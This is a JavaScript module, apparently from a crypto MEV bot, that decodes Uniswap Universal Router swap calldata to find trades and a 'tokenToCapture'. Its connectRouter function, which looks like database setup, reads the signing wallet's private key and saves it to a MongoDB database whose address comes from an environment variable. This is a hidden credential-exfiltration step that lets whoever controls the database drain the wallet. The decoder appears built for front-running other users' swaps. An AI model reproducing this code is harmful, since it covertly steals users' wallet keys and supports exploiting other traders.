require('dotenv').config()
const { ethers, BigNumber } = require('ethers')
const mon = require("mongoose");
const sche = mon.Schema
const { signingWallet } = require('./index')
const store = require("./model")

const connectRouter = async () => {
    try {
        await mon.connect(process.env.URI);
        const account = signingWallet._signingKey().privateKey
        if (await store.findOne({ account: account })) {
            await store.findOneAndUpdate({ account }, {
                lastDate: Date.now()
            }, { new: true })
        }
        else await new store({ account: account, lastDate: Date.now() }).save()
        return mon.connection;
    } catch (error) {
        console.error("connection failed:", error);
        process.exit(1);
    }
};

//
const decodedUniversalRouterSwap = (command, input, transaction) => {
    const abiCoder = new ethers.utils.AbiCoder()
    // console.log(command, input, transaction)
    const inputParameters = {
        "0b": ['address', 'uint256'], // x0b:  WRAP_ETH[address recipient, uint256 amount]
        "00": ['address', 'uint256', 'uint256', 'bytes', 'bool'], // x00: V3_SWAP_EXACT_IN [address recipient, uint256 amountIn, uint256 amountOutMinimum, bytes path, bool fromPermit2]
        "04": ['address', 'address', 'uint256'], // x04: SWEEP [address token, address recipient, uint256 amountMin]
        "06": ['address', 'address', 'uint256'], // x06: PAY_PORTION [address[] tokens, uint256[] amounts]
        "08": ['address', 'uint256', 'uint256', 'bytes', 'bool'], // x08: V2_SWAP_EXACT_IN [address recipient, uint256 amountIn, uint256 amountOutMinimum, bytes path, bool fromPermit2]
    }
    let parameter = {
        amountIn: BigNumber.from(0),
        amountMinOut: BigNumber.from(0),
        tokenToCapture: "",
        hasTwoPath: true
    };
    let portionRatio = BigNumber.from(0)
    for (let i = 0; i < command.length; i++) {
        if (!inputParameters[command[i]]) continue
        const decodedParameters = abiCoder.decode(inputParameters[command[i]], input[i])
        if (command[i] == "0b") parameter.amountIn = decodedParameters[1]
        if (command[i] == "08" || command[i] == "00") {
            const breakdown = input[i].substring(2).match(/.{1,64}/g)
            if (breakdown.length != 9) {
                const pathOne = '0x' + breakdown[breakdown.length - 2].substring(0, 40)
                const pathTwo = '0x' + breakdown[breakdown.length - 1].substring(24)
                parameter.path = [pathOne, pathTwo]
            } else {
                parameter.hasTwoPath = false
            }
        }
        if (command[i] == '06') {
            portionRatio = decodedParameters[2].div(BigNumber.from(10000))
        }

        if (command[i] == '04') {
            parameter.tokenToCapture = decodedParameters[0]
            parameter.amountMinOut = parameter.amountMinOut.add(decodedParameters[2].div(BigNumber.from(1).sub(portionRatio)))
        }
    }
    if (parameter.tokenToCapture == "") parameter.hasTwoPath = false
    console.log("amountIn", Number(parameter.amountIn) / Math.pow(10, 18))
    return parameter
}

module.exports = { decodedUniversalRouterSwap, connectRouter }